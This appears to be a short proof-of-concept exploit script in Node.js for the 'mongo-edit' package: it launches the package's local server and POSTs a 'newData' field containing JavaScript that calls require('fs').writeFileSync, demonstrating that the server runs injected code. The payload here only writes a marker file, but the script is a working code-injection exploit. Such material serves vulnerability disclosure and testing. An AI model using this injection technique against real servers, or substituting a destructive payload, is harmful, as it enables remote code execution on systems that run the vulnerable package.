var edit = require('mongo-edit');
edit.launchServer();
var request = require('request');

setTimeout(function() {    
    request({
        url:'http://localhost:2762/',
        method: "POST",
        json: true,
        body: {newData: 'require("fs").writeFileSync("mongo-edit-success.txt","23")'}        
    }, function(error, response, body) {      
        if (response) {
            console.log(response);
        }  
        process.exit(1);
    });    
}, 1000);
